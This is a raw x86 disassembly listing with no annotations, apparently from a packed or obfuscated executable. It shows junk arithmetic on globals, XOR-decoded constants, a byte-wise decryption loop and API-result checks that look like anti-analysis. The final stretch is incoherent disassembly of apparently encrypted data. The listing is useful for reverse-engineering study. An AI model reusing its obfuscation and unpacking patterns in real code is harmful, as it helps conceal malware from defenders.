  401df8:	xor    DWORD PTR ds:0x434008,0x435014
  401e02:	push   0x43a520
  401e07:	push   ebx
  401e08:	push   ebx
  401e09:	call   DWORD PTR ds:0x43a8fc
  401e0f:	test   eax,eax
  401e11:	mov    DWORD PTR ds:0x435004,0x62c7
  401e1b:	jne    0x40241c
  401e21:	sub    DWORD PTR ds:0x437000,0x3add
  401e2b:	push   0xd
  401e2d:	push   0x43a530
  401e32:	call   DWORD PTR ds:0x43a908
  401e38:	test   eax,eax
  401e3a:	mov    DWORD PTR ds:0x435010,0x130a
  401e44:	jne    0x402440
  401e4a:	and    DWORD PTR ds:0x434018,0x434024
  401e54:	push   0x43a544
  401e59:	push   ebx
  401e5a:	push   ebx
  401e5b:	call   DWORD PTR ds:0x43a8ec
  401e61:	test   eax,eax
  401e63:	mov    DWORD PTR ds:0x436008,0x3823
  401e6d:	jne    0x402440
  401e73:	adc    DWORD PTR ds:0x436014,0x437014
  401e7d:	push   0x9
  401e7f:	sub    DWORD PTR ds:0x437014,0x437010
  401e89:	push   0x43a55c
  401e8e:	call   DWORD PTR ds:0x43a8cc
  401e94:	not    DWORD PTR ds:0x43800c
  401e9a:	test   eax,eax
  401e9c:	mov    DWORD PTR ds:0x43501c,0x69de
  401ea6:	jne    0x40241c
  401eac:	sbb    DWORD PTR ds:0x436018,0x435008
  401eb6:	push   0x43a578
  401ebb:	push   ebx
  401ebc:	sub    DWORD PTR ds:0x438018,0x435008
  401ec6:	push   ebx
  401ec7:	call   DWORD PTR ds:0x43a8fc
  401ecd:	test   eax,eax
  401ecf:	mov    DWORD PTR ds:0x435018,0x17d7
  401ed9:	jne    0x40241c
  401edf:	sub    DWORD PTR ds:0x436010,0x435008
  401ee9:	push   0xd
  401eeb:	adc    DWORD PTR ds:0x43700c,0x43400c
  401ef5:	push   0x43a588
  401efa:	sbb    DWORD PTR ds:0x437014,0x437000
  401f04:	call   DWORD PTR ds:0x43a908
  401f0a:	test   eax,eax
  401f0c:	mov    DWORD PTR ds:0x434024,0x6a5c
  401f16:	jne    0x402440
  401f1c:	mov    eax,DWORD PTR [ebp-0x8]
  401f1f:	and    DWORD PTR ds:0x43500c,0x0
  401f29:	mov    ecx,DWORD PTR ds:0x43500c
  401f2f:	inc    ecx
  401f30:	mov    DWORD PTR ds:0x43500c,ecx
  401f36:	cmp    DWORD PTR ds:0x43500c,0x9
  401f3d:	ja     0x401f75
  401f43:	jmp    0x401f4e
  401f48:	call   DWORD PTR ds:0x43a904
  401f4e:	cmp    DWORD PTR ds:0x43500c,0x8
  401f55:	jne    0x401f68
  401f5b:	mov    ecx,DWORD PTR ds:0x43500c
  401f61:	inc    ecx
  401f62:	mov    DWORD PTR ds:0x43500c,ecx
  401f68:	cmp    DWORD PTR ds:0x43500c,0x14
  401f6f:	jb     0x401f29
  401f75:	mov    ecx,DWORD PTR [ebp-0x7c]
  401f78:	xor    eax,esi
  401f7a:	dec    DWORD PTR ds:0x43700c
  401f80:	add    eax,edi
  401f82:	mov    DWORD PTR ds:0x434010,0x1014
  401f8c:	cmp    eax,ecx
  401f8e:	jne    0x4023c3
  401f94:	sbb    DWORD PTR ds:0x437018,0x6417
  401f9e:	mov    eax,DWORD PTR [ebp-0x8]
  401fa1:	mov    ecx,DWORD PTR ds:0x43a2d4
  401fa7:	and    DWORD PTR ds:0x438014,0xc31
  401fb1:	mov    ecx,DWORD PTR [ecx+0x198]
  401fb7:	xor    eax,esi
  401fb9:	sub    DWORD PTR ds:0x436008,0x435010
  401fc3:	add    eax,edi
  401fc5:	cmp    eax,DWORD PTR [ecx]
  401fc7:	jne    0x402025
  401fcd:	movzx  eax,WORD PTR ds:0x435014
  401fd4:	and    DWORD PTR ds:0x434010,eax
  401fda:	mov    eax,DWORD PTR [ebp-0x8]
  401fdd:	adc    DWORD PTR ds:0x434018,0x436008
  401fe7:	push   0xf89c8585
  401fec:	xor    eax,esi
  401fee:	add    eax,edi
  401ff0:	adc    DWORD PTR ds:0x437018,0x127f
  401ffa:	push   eax
  401ffb:	dec    DWORD PTR ds:0x436004
  402001:	push   0xf89c85b9
  402006:	sbb    DWORD PTR ds:0x43501c,0x43600c
  402010:	push   DWORD PTR [ebp-0xc]
  402013:	and    DWORD PTR ds:0x434024,0x7b2c
  40201d:	push   DWORD PTR [ebp-0x8]
  402020:	call   0x407a51
  402025:	mov    eax,DWORD PTR [ebp-0xc]
  402028:	mov    DWORD PTR [ebp-0x4c],eax
  40202b:	mov    eax,DWORD PTR [ebp-0x8]
  40202e:	mov    DWORD PTR [ebp-0x60],eax
  402031:	mov    eax,DWORD PTR [ebp-0x60]
  402034:	xor    eax,esi
  402036:	add    eax,edi
  402038:	mov    DWORD PTR [ebp+0x10],eax
  40203b:	mov    eax,ds:0x43a154
  402040:	mov    eax,DWORD PTR [eax]
  402042:	mov    DWORD PTR [ebp+0x10],eax
  402045:	mov    eax,ds:0x43a35c
  40204a:	mov    eax,DWORD PTR [eax]
  40204c:	mov    DWORD PTR [ebp-0x18],eax
  40204f:	mov    DWORD PTR [ebp+0xc],0xf89c8785
  402056:	mov    eax,DWORD PTR [ebp+0xc]
  402059:	xor    eax,esi
  40205b:	add    eax,edi
  40205d:	mov    DWORD PTR [ebp+0xc],eax
  402060:	mov    eax,ds:0x43a2d4
  402065:	mov    DWORD PTR [ebp+0xc],eax
  402068:	mov    eax,DWORD PTR [ebp+0x10]
  40206b:	mov    DWORD PTR [ebp+0xc],eax
  40206e:	mov    eax,DWORD PTR [ebp+0xc]
  402071:	push   0x4
  402073:	pop    ecx
  402074:	sub    ecx,eax
  402076:	add    ecx,DWORD PTR [ebp-0x18]
  402079:	mov    DWORD PTR [ebp-0x38],0xf89c85c5
  402080:	mov    DWORD PTR [ebp+0x10],ecx
  402083:	mov    DWORD PTR [ebp-0x108],0xf89c85b9
  40208d:	mov    eax,DWORD PTR [ebp+0xc]
  402090:	mov    DWORD PTR [ebp-0x104],eax
  402096:	mov    eax,DWORD PTR [ebp+0x10]
  402099:	mov    DWORD PTR [ebp-0x100],eax
  40209f:	mov    eax,DWORD PTR [ebp-0x38]
  4020a2:	xor    eax,esi
  4020a4:	add    eax,edi
  4020a6:	mov    DWORD PTR [ebp-0xfc],eax
  4020ac:	lea    eax,[ebp-0x98]
  4020b2:	mov    DWORD PTR [ebp-0xf8],eax
  4020b8:	mov    eax,DWORD PTR [ebp-0x108]
  4020be:	xor    eax,esi
  4020c0:	add    eax,edi
  4020c2:	mov    DWORD PTR [ebp-0x108],eax
  4020c8:	lea    eax,[ebp-0x108]
  4020ce:	push   eax
  4020cf:	mov    eax,DWORD PTR [ebp-0x4c]
  4020d2:	xor    eax,esi
  4020d4:	add    eax,edi
  4020d6:	push   eax
  4020d7:	mov    eax,ds:0x43a2f4
  4020dc:	push   0x43a24a
  4020e1:	push   DWORD PTR [eax]
  4020e3:	call   0x404c64
  4020e8:	mov    eax,DWORD PTR [ebp+0xc]
  4020eb:	mov    ecx,DWORD PTR [ebp+0x10]
  4020ee:	mov    DWORD PTR [ebp-0x84],ecx
  4020f4:	mov    ecx,DWORD PTR [ebp-0x60]
  4020f7:	xor    ecx,esi
  4020f9:	mov    DWORD PTR [ebp-0x18],eax
  4020fc:	add    ecx,edi
  4020fe:	jmp    0x402361
  402103:	lea    edx,[ecx+eax*1]
  402106:	mov    DWORD PTR [ebp+0x10],edx
  402109:	mov    edx,DWORD PTR [ebp-0x84]
  40210f:	sub    edx,ecx
  402111:	mov    DWORD PTR [ebp+0xc],edx
  402114:	mov    edx,DWORD PTR [ebp+0xc]
  402117:	mov    DWORD PTR [ebp-0x54],edx
  40211a:	mov    edx,DWORD PTR [ebp+0x10]
  40211d:	mov    DWORD PTR [ebp-0x50],0xf89c8585
  402124:	mov    DWORD PTR [ebp-0x6c],edx
  402127:	mov    DWORD PTR [ebp-0x24],0xf89c8584
  40212e:	mov    edx,DWORD PTR [ebp-0x50]
  402131:	xor    edx,esi
  402133:	add    edx,edi
  402135:	mov    DWORD PTR [ebp+0x10],edx
  402138:	mov    edx,DWORD PTR [ebp-0x50]
  40213b:	xor    edx,esi
  40213d:	add    edx,edi
  40213f:	mov    DWORD PTR [ebp+0xc],edx
  402142:	mov    DWORD PTR [ebp-0x68],0xf89c85a5
  402149:	mov    DWORD PTR [ebp-0x74],0xf89c85be
  402150:	mov    edx,DWORD PTR [ebp-0x50]
  402153:	mov    ebx,DWORD PTR [ebp-0x54]
  402156:	xor    edx,esi
  402158:	add    edx,edi
  40215a:	cmp    ebx,edx
  40215c:	je     0x402355
  402162:	mov    eax,DWORD PTR [ebp-0x24]
  402165:	xor    eax,esi
  402167:	mov    edx,0xffcd8d1e
  40216c:	sub    edx,eax
  40216e:	add    edx,DWORD PTR [ebp-0x54]
  402171:	mov    eax,DWORD PTR [ebp-0x24]
  402174:	mov    ebx,DWORD PTR [ebp+0x10]
  402177:	xor    eax,esi
  402179:	add    eax,edi
  40217b:	imul   eax,ebx
  40217e:	cmp    eax,edx
  402180:	ja     0x402352
  402186:	mov    edx,DWORD PTR [ebp+0x10]
  402189:	mov    eax,DWORD PTR [ebp-0x54]
  40218c:	mov    ebx,DWORD PTR [ebp-0x68]
  40218f:	sub    eax,edx
  402191:	xor    ebx,esi
  402193:	xor    edx,edx
  402195:	add    ebx,edi
  402197:	div    ebx
  402199:	mov    DWORD PTR [ebp+0xc],eax
  40219c:	mov    eax,DWORD PTR [ebp-0x74]
  40219f:	mov    edx,DWORD PTR [ebp+0xc]
  4021a2:	xor    eax,esi
  4021a4:	add    eax,edi
  4021a6:	cmp    edx,eax
  4021a8:	jbe    0x4021b8
  4021ae:	mov    eax,DWORD PTR [ebp-0x74]
  4021b1:	xor    eax,esi
  4021b3:	add    eax,edi
  4021b5:	mov    DWORD PTR [ebp+0xc],eax
  4021b8:	mov    eax,DWORD PTR [ebp-0x68]
  4021bb:	mov    edx,DWORD PTR [ebp+0xc]
  4021be:	xor    eax,esi
  4021c0:	add    eax,edi
  4021c2:	imul   eax,edx
  4021c5:	mov    DWORD PTR [ebp+0xc],eax
  4021c8:	mov    eax,DWORD PTR [ebp-0x50]
  4021cb:	mov    edx,DWORD PTR [ebp+0xc]
  4021ce:	xor    eax,esi
  4021d0:	add    eax,edi
  4021d2:	cmp    edx,eax
  4021d4:	je     0x40233b
  4021da:	mov    eax,DWORD PTR [ebp+0xc]
  4021dd:	mov    DWORD PTR [ebp-0x3c],eax
  4021e0:	mov    eax,DWORD PTR [ebp+0x10]
  4021e3:	add    eax,DWORD PTR [ebp-0x6c]
  4021e6:	mov    DWORD PTR [ebp-0x38],0xf89c8585
  4021ed:	mov    DWORD PTR [ebp-0x30],eax
  4021f0:	mov    eax,0xf89c8584
  4021f5:	mov    DWORD PTR [ebp-0x64],eax
  4021f8:	mov    DWORD PTR [ebp-0x58],0xf89c85bb
  4021ff:	mov    DWORD PTR [ebp-0x10],0xf89c85ba
  402206:	mov    DWORD PTR [ebp-0x2c],eax
  402209:	mov    eax,DWORD PTR [ebp-0x38]
  40220c:	xor    eax,esi
  40220e:	add    eax,edi
  402210:	jmp    0x4022f7
  402215:	mov    DWORD PTR [ebp-0x78],0xf89c85b3
  40221c:	mov    DWORD PTR [ebp-0x80],0xf89c85a9
  402223:	mov    eax,DWORD PTR [ebp-0x2c]
  402226:	mov    edx,DWORD PTR [ebp+0xc]
  402229:	xor    eax,esi
  40222b:	add    eax,edi
  40222d:	imul   eax,edx
  402230:	mov    edx,DWORD PTR [ebp-0x30]
  402233:	mov    al,BYTE PTR [eax+edx*1]
  402236:	mov    BYTE PTR [ebp-0x1],al
  402239:	mov    eax,DWORD PTR [ebp-0x2c]
  40223c:	mov    edx,DWORD PTR [ebp+0xc]
  40223f:	xor    eax,esi
  402241:	add    eax,edi
  402243:	imul   eax,edx
  402246:	mov    edx,DWORD PTR [ebp-0x58]
  402249:	xor    edx,esi
  40224b:	add    eax,edx
  40224d:	mov    edx,DWORD PTR [ebp-0x30]
  402250:	movzx  eax,BYTE PTR [eax+edx*1+0x3272e2]
  402258:	mov    edx,DWORD PTR [ebp-0x78]
  40225b:	xor    edx,esi
  40225d:	lea    eax,[edx+eax*1+0x3272e2]
  402264:	movzx  edx,BYTE PTR [ebp-0x1]
  402268:	xor    edx,eax
  40226a:	mov    BYTE PTR [ebp-0x1],dl
  40226d:	mov    al,BYTE PTR [ebp-0x1]
  402270:	mov    edx,DWORD PTR [ebp-0x2c]
  402273:	mov    ebx,DWORD PTR [ebp+0xc]
  402276:	xor    edx,esi
  402278:	add    edx,edi
  40227a:	imul   edx,ebx
  40227d:	mov    ebx,DWORD PTR [ebp-0x30]
  402280:	mov    BYTE PTR [edx+ebx*1],al
  402283:	mov    eax,DWORD PTR [ebp-0x2c]
  402286:	mov    edx,DWORD PTR [ebp+0xc]
  402289:	xor    eax,esi
  40228b:	add    eax,edi
  40228d:	imul   eax,edx
  402290:	mov    edx,DWORD PTR [ebp-0x30]
  402293:	mov    al,BYTE PTR [eax+edx*1]
  402296:	mov    BYTE PTR [ebp-0x1],al
  402299:	mov    eax,DWORD PTR [ebp-0x2c]
  40229c:	mov    edx,DWORD PTR [ebp+0xc]
  40229f:	xor    eax,esi
  4022a1:	add    eax,edi
  4022a3:	imul   eax,edx
  4022a6:	mov    edx,DWORD PTR [ebp-0x64]
  4022a9:	xor    edx,esi
  4022ab:	add    eax,edx
  4022ad:	mov    edx,DWORD PTR [ebp-0x30]
  4022b0:	movzx  eax,BYTE PTR [eax+edx*1+0x3272e2]
  4022b8:	mov    edx,DWORD PTR [ebp-0x80]
  4022bb:	xor    edx,esi
  4022bd:	lea    eax,[edx+eax*1+0x3272e2]
  4022c4:	movzx  edx,BYTE PTR [ebp-0x1]
  4022c8:	xor    edx,eax
  4022ca:	mov    BYTE PTR [ebp-0x1],dl
  4022cd:	mov    al,BYTE PTR [ebp-0x1]
  4022d0:	mov    edx,DWORD PTR [ebp-0x2c]
  4022d3:	mov    ebx,DWORD PTR [ebp+0xc]
  4022d6:	xor    edx,esi
  4022d8:	add    edx,edi
  4022da:	imul   edx,ebx
  4022dd:	mov    ebx,DWORD PTR [ebp-0x30]
  4022e0:	mov    BYTE PTR [edx+ebx*1],al
  4022e3:	mov    eax,DWORD PTR [ebp-0x10]
  4022e6:	mov    edx,DWORD PTR [ebp-0x64]
  4022e9:	xor    eax,esi
  4022eb:	xor    edx,esi
  4022ed:	add    eax,edi
  4022ef:	add    edx,edi
  4022f1:	imul   eax,edx
  4022f4:	add    eax,DWORD PTR [ebp+0xc]
  4022f7:	mov    DWORD PTR [ebp+0xc],eax
  4022fa:	mov    eax,DWORD PTR [ebp+0xc]
  4022fd:	mov    edx,DWORD PTR [ebp-0x3c]
  402300:	cmp    edx,eax
  402302:	jb     0x402215
  402308:	mov    eax,DWORD PTR [ebp-0x64]
  40230b:	mov    edx,DWORD PTR [ebp-0x3c]
  40230e:	xor    eax,esi
  402310:	add    eax,edi
  402312:	imul   eax,edx
  402315:	mov    edx,DWORD PTR [ebp-0x38]
  402318:	xor    edx,esi
  40231a:	add    edx,edi
  40231c:	or     eax,edx
  40231e:	mov    edx,DWORD PTR [ebp-0x24]
  402321:	xor    edx,esi
  402323:	add    eax,edx
  402325:	mov    edx,DWORD PTR [ebp-0x24]
  402328:	xor    edx,esi
  40232a:	add    eax,edx
  40232c:	mov    edx,DWORD PTR [ebp+0x10]
  40232f:	lea    eax,[eax+edx*1+0x64e5c4]
  402336:	jmp    0x40234a
  40233b:	mov    eax,DWORD PTR [ebp-0x24]
  40233e:	mov    edx,DWORD PTR [ebp+0x10]
  402341:	xor    eax,esi
  402343:	lea    eax,[eax+edx*1+0x3272e2]
  40234a:	mov    DWORD PTR [ebp+0x10],eax
  40234d:	jmp    0x402162
  402352:	mov    eax,DWORD PTR [ebp-0x18]
  402355:	mov    edx,DWORD PTR [ebp-0x4c]
  402358:	xor    edx,esi
  40235a:	lea    ecx,[ecx+edx*1+0x3272e2]
  402361:	lea    edx,[ecx-0x3272e2]
  402367:	xor    edx,esi
  402369:	cmp    edx,0xf89c9585
  40236f:	jne    0x402103
  402375:	mov    ecx,DWORD PTR [ebp-0x60]
  402378:	mov    edx,DWORD PTR [ebp-0x4c]
  40237b:	mov    ebx,DWORD PTR [ebp-0x60]
  40237e:	xor    edx,esi
  402380:	mov    dl,BYTE PTR [edx+eax*1+0x3272e2]
  402387:	xor    ecx,esi
  402389:	mov    cl,BYTE PTR [ecx+eax*1+0x3272e2]
  402390:	xor    ebx,esi
  402392:	mov    BYTE PTR [ebx+eax*1+0x3272e2],dl
  402399:	mov    edx,DWORD PTR [ebp-0x4c]
  40239c:	xor    edx,esi
  40239e:	mov    BYTE PTR [edx+eax*1+0x3272e2],cl
  4023a5:	mov    eax,DWORD PTR [ebp-0x4c]
  4023a8:	mov    eax,DWORD PTR [ebp-0x8]
  4023ab:	xor    eax,esi
  4023ad:	add    eax,edi
  4023af:	mov    ds:0x43a358,eax
  4023b4:	mov    eax,DWORD PTR [ebp-0x8]
  4023b7:	xor    eax,esi
  4023b9:	add    eax,edi
  4023bb:	xor    ebx,ebx
  4023bd:	mov    ds:0x43a350,eax
  4023c2:	inc    ebx
  4023c3:	lea    eax,[ebp-0x40]
  4023c6:	mov    DWORD PTR [ebp-0x88],eax
  4023cc:	lea    eax,[ebp+0x4]
  4023cf:	mov    DWORD PTR [ebp-0x40],eax
  4023d2:	mov    eax,DWORD PTR [ebp-0x40]
  4023d5:	test   eax,eax
  4023d7:	je     0x402572
  4023dd:	push   0x43a59c
  4023e2:	push   ebx
  4023e3:	push   ebx
  4023e4:	call   DWORD PTR ds:0x43a8ec
  4023ea:	test   eax,eax
  4023ec:	jne    0x402440
  4023f2:	push   0x9
  4023f4:	push   0x43a5b4
  4023f9:	call   DWORD PTR ds:0x43a8cc
  4023ff:	test   eax,eax
  402401:	jne    0x40241c
  402407:	push   0x43a5d0
  40240c:	push   ebx
  40240d:	push   ebx
  40240e:	call   DWORD PTR ds:0x43a8fc
  402414:	test   eax,eax
  402416:	je     0x40242b
  40241c:	lea    eax,[ebp-0x20]
  40241f:	push   eax
  402420:	call   DWORD PTR ds:0x43a8bc
  402426:	jmp    0x40258d
  40242b:	push   0xd
  40242d:	push   0x43a5e0
  402432:	call   DWORD PTR ds:0x43a908
  402438:	test   eax,eax
  40243a:	je     0x402447
  402440:	xor    eax,eax
  402442:	jmp    0x40258d
  402447:	mov    DWORD PTR [ebp-0x94],0xf152c3c
  402451:	mov    DWORD PTR [ebp-0xa0],0x712ed0f
  40245b:	mov    DWORD PTR [ebp-0x8c],0x373fc2d
  402465:	mov    DWORD PTR [ebp-0x90],0x72670a1d
  40246f:	call   0x405387
  402474:	mov    eax,DWORD PTR [ebp-0x28]
  402477:	mov    eax,DWORD PTR [ebp-0xc]
  40247a:	mov    eax,DWORD PTR [ebp-0x8]
  40247d:	mov    DWORD PTR [ebp+0xc],eax
  402480:	mov    eax,eax
  402482:	mov    eax,ds:0x43a2d4
  402487:	mov    eax,DWORD PTR [eax+0x1c8]
  40248d:	mov    eax,DWORD PTR [eax]
  40248f:	cdq    
  402490:	mov    ebx,eax
  402492:	mov    eax,0xfabdbee7
  402497:	add    ebx,eax
  402499:	adc    edx,0xffffffff
  40249c:	and    DWORD PTR [ebp-0x10],0x0
  4024a0:	xor    edx,0x0
  4024a3:	mov    DWORD PTR [ebp-0x6c],edx
  4024a6:	mov    edx,DWORD PTR [ebp+0xc]
  4024a9:	mov    DWORD PTR [ebp-0x14],edx
  4024ac:	mov    ecx,0x8a29a12d
  4024b1:	xor    ebx,ecx
  4024b3:	add    DWORD PTR [ebp-0x14],eax
  4024b6:	mov    edx,DWORD PTR [ebp-0x14]
  4024b9:	adc    DWORD PTR [ebp-0x10],0xffffffff
  4024bd:	xor    edx,ecx
  4024bf:	mov    DWORD PTR [ebp-0x5c],edx
  4024c2:	mov    edx,DWORD PTR [ebp-0x10]
  4024c5:	xor    edx,0x0
  4024c8:	mov    DWORD PTR [ebp-0x58],edx
  4024cb:	cmp    DWORD PTR [ebp-0x5c],ebx
  4024ce:	jne    0x4024e0
  4024d4:	mov    edx,DWORD PTR [ebp-0x6c]
  4024d7:	cmp    DWORD PTR [ebp-0x58],edx
  4024da:	je     0x40250f
  4024e0:	mov    edx,DWORD PTR ds:0x43a2d4
  4024e6:	mov    edx,DWORD PTR [edx+0x1c0]
  4024ec:	mov    edx,DWORD PTR [edx]
  4024ee:	xor    ebx,ebx
  4024f0:	add    edx,eax
  4024f2:	adc    ebx,0xffffffff
  4024f5:	xor    edx,ecx
  4024f7:	xor    ebx,0x0
  4024fa:	cmp    edx,0x70941fc5
  402500:	jne    0x402572
  402506:	cmp    ebx,0xffffffff
  402509:	jne    0x402572
  40250f:	mov    edx,DWORD PTR ds:0x43a350
  402515:	mov    ebx,DWORD PTR ds:0x43a358
  40251b:	xor    edx,ebx
  40251d:	mov    DWORD PTR ds:0x43a350,edx
  402523:	mov    edx,DWORD PTR [ebp-0x40]
  402526:	mov    ebx,DWORD PTR ds:0x43a350
  40252c:	add    ebx,DWORD PTR [edx]
  40252e:	mov    edx,DWORD PTR [ebp-0x40]
  402531:	mov    DWORD PTR [edx],ebx
  402533:	mov    edx,DWORD PTR [ebp+0xc]
  402536:	xor    esi,edx
  402538:	mov    edx,DWORD PTR ds:0x43a350
  40253e:	add    esi,edi
  402540:	xor    ebx,ebx
  402542:	add    esi,eax
  402544:	adc    ebx,0xffffffff
  402547:	xor    edi,edi
  402549:	xor    esi,ecx
  40254b:	xor    ebx,0x0
  40254e:	add    edx,eax
  402550:	adc    edi,0xffffffff
  402553:	xor    edx,ecx
  402555:	xor    edi,0x0
  402558:	cmp    edx,esi
  40255a:	jne    0x402572
  402560:	cmp    edi,ebx
  402562:	jne    0x402572
  402568:	mov    eax,ds:0x43a350
  40256d:	mov    ds:0x43a358,eax
  402572:	mov    eax,ds:0x43a2d4
  402577:	push   0x4
  402579:	add    eax,0x1cc
  40257e:	push   eax
  40257f:	lea    eax,[ebp-0x28]
  402582:	push   eax
  402583:	call   0x402598
  402588:	mov    eax,DWORD PTR [ebp-0x28]
  40258b:	mov    eax,DWORD PTR [eax]
  40258d:	pop    edi
  40258e:	pop    ebx
  40258f:	pop    esi
  402590:	leave  
  402591:	ret    0xc
  402594:	xor    eax,eax
  402596:	inc    eax
  402597:	ret    
  402598:	push   ebp
  402599:	mov    ebp,esp
  40259b:	sub    esp,0x10
  40259e:	mov    ecx,DWORD PTR ds:0x438004
  4025a4:	sbb    ecx,DWORD PTR ds:0x434000
  4025aa:	mov    DWORD PTR ds:0x438004,ecx
  4025b0:	mov    eax,0xf89c8585
  4025b5:	add    DWORD PTR ds:0x437018,0x7358
  4025bf:	mov    DWORD PTR [ebp-0x4],eax
  4025c2:	mov    DWORD PTR [ebp-0x8],0xf89c8584
  4025c9:	movzx  edx,WORD PTR ds:0x436014
  4025d0:	sub    DWORD PTR ds:0x43701c,edx
  4025d6:	mov    ecx,DWORD PTR [ebp-0x4]
  4025d9:	dec    edx
  4025da:	jmp    0x404996
  4025df:	sub    DWORD PTR [edx+0x13b763cc],eax
  4025e5:	jae    0x402659
  4025e7:	xchg   ecx,eax
  4025e8:	xchg   esp,eax
  4025e9:	pop    ecx
  4025ea:	int3   
  4025eb:	xor    al,0x82
  4025ed:	mov    bl,0xde
  4025ef:	jl     0x40266d
  4025f1:	jl     0x40266f
  4025f3:	rcr    DWORD PTR [edi+0x7c],cl
  4025f6:	jl     0x40260d
  4025f8:	cs pop ss
  4025fa:	cmp    DWORD PTR [ecx],edx
  4025fc:	and    eax,0x30652f13
  402601:	popa   
  402602:	pusha  
  402603:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402604:	jp     0x402672
  402606:	ins    BYTE PTR es:[edi],dx
  402607:	ins    DWORD PTR es:[edi],dx
  402608:	xor    al,0xc5
  40260a:	fdivp  st(1),st
  40260c:	push   0x42
  40260e:	arpl   WORD PTR [ecx+0x53],di
  402611:	stos   BYTE PTR es:[edi],al
  402612:	jp     0x402681
  402614:	push   ecx
  402615:	iret   
  402616:	pop    ebp
  402617:	dec    esp
  402618:	cmp    cl,BYTE PTR [esi+0x577087fc]
  40261e:	dec    ebp
  40261f:	jg     0x402658
  402621:	mov    ah,BYTE PTR [eax+0x33a4ba7f]
  402627:	jmp    DWORD PTR cs:[eax-0x22]
  40262b:	cld    
  40262c:	imul   edi,DWORD PTR [edi+0x18],0xffffffed
  402630:	xor    ebp,ecx
  402632:	mov    esp,0xd82b87ed
  402637:	and    DWORD PTR [ecx],0xf
  40263a:	push   ecx
  40263b:	mov    ds:0x6df7c68c,eax
  402640:	fld    QWORD PTR [esi]
  402642:	(bad)  
  402643:	or     ah,bh
  402645:	and    BYTE PTR [edx],dl
  402647:	inc    edx
  402648:	push   cs
  402649:	and    BYTE PTR [ebx+0x62],ah
  40264c:	mov    cl,0xaf
  40264e:	sub    ebx,DWORD PTR [ecx+0x5]
  402651:	mov    al,ds:0x2341e1ff
  402656:	jbe    0x40268c
  402658:	ret    0xf153
  40265b:	sbb    al,0xfc
  40265d:	jb     0x402618
  40265f:	jnp    0x40263e
  402661:	xchg   edx,eax
  402662:	pop    edi
  402663:	cmp    DWORD PTR [ecx+0x49841607],0xb
  40266a:	cwde   
  40266b:	ds je  0x4025f9
  40266e:	add    ebx,esp
  402670:	sub    eax,0x4b368d54
  402675:	push   esi
  402676:	sti    
  402677:	iret   
  402678:	mov    WORD PTR [ecx],fs
  40267a:	or     edx,0x6982ceb7
  402680:	out    0x45,al
  402682:	push   esp
  402683:	dec    esi
  402684:	push   cs
  402685:	cmp    BYTE PTR [ebx],cl
  402687:	xor    BYTE PTR [ebx],bl
  402689:	lods   eax,DWORD PTR ds:[esi]
  40268a:	inc    ebx
  40268b:	int3   
  40268c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40268d:	dec    edx
  40268e:	fiadd  DWORD PTR [esi]
  402690:	push   eax
  402691:	std    
  402692:	push   esp
  402693:	push   eax
  402694:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402695:	icebp  
  402696:	bound  edi,QWORD PTR [edi+0x791844f2]
  40269c:	imul   eax,DWORD PTR [edi-0x123666b9],0xffffffd0
  4026a3:	jnp    0x402679
  4026a5:	jne    0x4026df
  4026a7:	ss cdq 
  4026a9:	(bad)  
  4026aa:	rcr    BYTE PTR [ecx],1
  4026ac:	mov    ecx,0x665e1134
  4026b1:	jb     0x40267b
  4026b3:	sahf   
  4026b4:	arpl   cx,si
  4026b6:	sbb    eax,0x8e493d72
  4026bb:	fst    DWORD PTR ds:0xe64b34f5
  4026c1:	mov    bh,bl
  4026c3:	cld    
  4026c4:	(bad)  
  4026c5:	lea    ecx,[ebp+0x991da75]
  4026cb:	popa   
  4026cc:	fxch   st(2)
  4026ce:	sbb    al,0x63
  4026d0:	xchg   esp,eax
  4026d1:	pop    ebp
  4026d2:	repz push cs
  4026d4:	sbb    al,dh
  4026d6:	push   ebx
  4026d7:	lods   eax,DWORD PTR ds:[esi]
  4026d8:	cli    
  4026d9:	pop    ebp
  4026da:	ins    DWORD PTR es:[edi],dx
  4026db:	sbb    ah,BYTE PTR [edx+esi*8-0x55]
  4026df:	push   esp
  4026e0:	test   DWORD PTR [ebx+0x5a772999],ecx
  4026e6:	pop    esp
  4026e7:	sbb    BYTE PTR [ecx+edi*8+0x3e],ah
  4026eb:	mov    esp,0x2300332b
  4026f0:	pop    ebp
  4026f1:	aam    0xcb
  4026f3:	xchg   DWORD PTR [eax-0x1baade37],ebp
  4026f9:	adc    BYTE PTR [eax],0x22
  4026fc:	loop   0x40274b
  4026fe:	inc    ebx
  4026ff:	mov    ss,ebp
  402701:	lahf   
  402702:	pop    ebp
  402703:	mov    ebx,0x4caf847d
  402708:	mov    ecx,0x8207cb03
  40270d:	sub    BYTE PTR [edx],ah
  40270f:	cmp    eax,esp
  402711:	js     0x402725
  402713:	fmul   QWORD PTR [ebx-0x2c2345eb]
  402719:	iret   
  40271a:	fstp   st(2)
  40271c:	test   ecx,esi
  40271e:	or     BYTE PTR [ebp+0x351220b0],dh
  402724:	popf   
  402725:	mov    esp,0x8df96729
  40272a:	dec    eax
  40272b:	lods   al,BYTE PTR ds:[esi]
  40272c:	clc    
  40272d:	push   ss
  40272e:	mov    ecx,0x86d4a4d2
  402733:	ins    BYTE PTR es:[edi],dx
  402734:	pop    ebx
  402735:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402736:	mov    al,0xeb
  402738:	lahf   
  402739:	xchg   BYTE PTR [edi],dh
  40273b:	fst    DWORD PTR [ecx-0x70186488]
  402741:	loope  0x402724
  402743:	mov    cl,0x36
  402745:	in     eax,dx
  402746:	add    ah,BYTE PTR [ebp-0x78f1c4b4]
  40274c:	xchg   BYTE PTR [ecx-0x30],dh
  40274f:	test   DWORD PTR [edx+0x7c],0x14d5e7d0
  402756:	jge    0x402717
  402758:	sar    al,0xd5
  40275b:	sbb    al,0x73
  40275d:	push   ebp
  40275e:	adc    BYTE PTR [edx+ebx*8],bh
  402761:	fistp  WORD PTR [ebx+eax*8-0x78]
  402765:	ss enter 0x7e83,0x99
  40276a:	adc    ah,BYTE PTR [ebx-0x19]
  40276d:	cmp    al,0x61
  40276f:	adc    al,0x8a
  402771:	bound  eax,QWORD PTR [ecx]
  402773:	mov    ds:0x4697cd26,al
  402778:	cmp    dh,BYTE PTR [eax]
  40277a:	dec    eax
  40277b:	or     esi,DWORD PTR [edx+0x2b822e53]
  402781:	rol    ebp,1
  402783:	add    cl,BYTE PTR [eax+0x373c957]
  402789:	push   esp
